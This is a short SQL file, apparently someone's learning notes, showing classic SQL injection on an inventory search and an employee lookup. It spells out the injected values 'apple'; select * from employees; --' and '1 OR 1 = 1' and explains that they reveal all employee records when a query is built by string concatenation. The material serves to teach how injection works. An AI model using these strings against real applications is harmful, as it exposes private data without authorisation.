select * 
from sales.inventory 
where  inventory.item_name LIKE '%bread%';

select * 
from sales.inventory 
where  inventory.item_name = 'apple'; select * from employees; -- ';
-- so all i need to do to steal all the employee data is search by: "apple'; select * from employees; -- "

select *
from employees
where employee_id = 1 OR 1 = 1; -- This is another common sql injection trick
-- instead of just my account info I get all the employee data bc the where clause evaluates to true
-- all I need to do is enter: 
/*
    1 OR 1 = 1 
    instead of just my employee id 
    1
*/
-- (assuming they are using string concatenation)